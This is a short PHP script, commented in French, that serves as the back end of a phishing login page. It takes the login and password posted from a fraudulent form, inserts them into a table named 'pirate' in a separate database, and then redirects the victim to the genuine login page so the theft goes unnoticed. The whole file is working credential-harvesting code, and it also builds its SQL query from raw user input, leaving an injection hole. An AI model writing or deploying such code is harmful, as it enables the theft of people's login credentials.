<?php

function getMySqliConnection() {
  $db_connection_array = parse_ini_file("config/config.ini");
  return new mysqli($db_connection_array['DB_HOST'], $db_connection_array['DB_USER'], $db_connection_array['DB_PASSWD'], $db_connection_array['DB_NAME']);
}
//0n connecte sur une base de donnée pirate avec une table qui va récupérer les logins et mdp entrés dans le formulaire frauduleux


$login=$_POST['login'];
$mdp=$_POST['mdp'];
$mysqli = getMySqliConnection();
if ($mysqli->connect_error) {
      echo 'Erreur connection BDD (' . $mysqli->connect_errno . ') '. $mysqli->connect_error;
  } else {
      $req="INSERT INTO pirate (login,mdp) VALUES ('$login', '$mdp');";  //on insère les valeurs du clavier dans notre table pirate
  }
  $mysqli->query($req);
  $mysqli->close();
  
  
  header( "Location:vw_login.php");  // on redirige vers la véritable page de login pour éviter que l'utilisateur se rende compte qu'il n'a pas utilisé le bon lien
 ?>
